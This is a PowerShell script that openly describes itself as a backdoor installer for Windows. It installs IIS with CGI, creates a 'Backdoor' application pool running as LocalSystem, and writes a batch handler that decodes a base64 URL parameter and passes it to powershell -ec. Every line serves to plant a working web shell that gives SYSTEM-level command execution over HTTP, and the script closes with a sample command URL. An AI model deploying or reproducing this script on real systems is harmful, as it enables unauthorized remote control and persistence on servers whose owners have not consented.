# this script creates a backdoor on the Windows machine:
# 1. installs IIS, including features needed.
# 2. takes the first running website.
# 3. creates an apppool running on system.
# 4. creates a virtual app.
# 5. creates two simple scripts.
# 6. configures CGI to run the script.
# You can issue a command to the server by going to the /Backdoor/command.text?ec=xxxx where xxxx is what you usually use as EncodedCommand.

Write-Host "Installing Windows features... " -ForegroundColor Cyan -NoNewline
Add-WindowsFeature -Name Web-Default-Doc, Web-Http-Errors, Web-Static-Content, Web-Http-Logging, Web-CGI | Out-Null
Write-Host "IIS Management... " -ForegroundColor Cyan -NoNewline
if (Test-Path "$env:windir\System32\mmc.exe") # only for GUI versions of the OS
    {
    Add-WindowsFeature -Name Web-Mgmt-Console | Out-Null
    }

if (!(Test-Path "$env:windir\System32\inetsrv\cgi.dll"))
    {
    Write-Host "[ERR] Error installing IIS features" -ForegroundColor Red
    break
    }
Write-Host ("Done.") -ForegroundColor Cyan 
Start-Sleep -Seconds 10 # allow iis to start fully

# Taking the first started website. Feel free to modify the query if you believe other site is better. 
# You can also create your own.
$Site = (Get-IISSite | Where-Object {$_.State -eq "Started"} | Sort-Object -Property ID)

if ($null -eq $Site)
{
    Write-Host "[ERR] Error getting IIS site" -ForegroundColor Red
    break
}

$siteName = $Site.Name
$rootPath = (Get-WebFilePath "IIS:\Sites\$siteName").FullName

$AppPool = New-WebAppPool -Name "Backdoor" -Force
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST'  -filter "system.applicationHost/applicationPools/add[@name='Backdoor']/processModel" -name "identityType" -value "LocalSystem"
New-WebApplication -Site $siteName -Name "Backdoor" -ApplicationPool $AppPool.name -PhysicalPath $rootPath

Write-Host "Creating scripts... " -ForegroundColor Cyan -NoNewline
$scriptName = $rootPath+"\command.text"
"xD" | out-file -filepath $scriptName -Encoding ascii #no -append

$scriptName = $rootPath+"\backdoor.cmd"
"@echo off" | out-file -filepath $scriptName -Encoding ascii #no -append
"echo HTTP/1.1 200 OK" | out-file -append -filepath $scriptName -Encoding ascii
"echo Content-Type: text/html" | out-file -append -filepath $scriptName -Encoding ascii
"echo." | out-file -append -filepath $scriptName -Encoding ascii
"" | out-file -append -filepath $scriptName -Encoding ascii
"set b64=%QUERY_STRING:~3%" | out-file -append -filepath $scriptName -Encoding ascii
"powershell.exe -NonInteractive -NoProfile -ec %b64%" | out-file -append -filepath $scriptName -Encoding ascii
Write-Host "Done." -ForegroundColor Cyan 

Write-Host "Configuring IIS... " -ForegroundColor Cyan -NoNewline
Write-Host "CGI... " -ForegroundColor Cyan -NoNewline
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST'  -filter "system.webServer/security/isapiCgiRestriction" -name "." -value @{path=('c:\windows\system32\cmd.exe /c "'+$scriptName+'"');allowed='True';description='BackdoorScript'}
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location $siteName -filter "system.webServer/handlers" -name "accessPolicy" -value "Read,Execute,Script"
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location $siteName -filter "system.webServer/handlers" -name "." -value @{name='Backdoor';path='*.text';verb='GET';modules='CgiModule';scriptProcessor=('c:\windows\system32\cmd.exe /c "'+$scriptName+'"');resourceType='File';requireAccess='Execute'}
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location "$siteName/Backdoor" -filter "system.webServer/cgi" -name "createCGIWithNewConsole" -value "True"
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location "$siteName/Backdoor" -filter "system.webServer/cgi" -name "createProcessAsUser" -value "False"
Write-Host "Done." -ForegroundColor Cyan 

Write-Host "Try to open http://localhost/Backdoor/command.text?ec=dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==" -ForegroundColor Cyan 
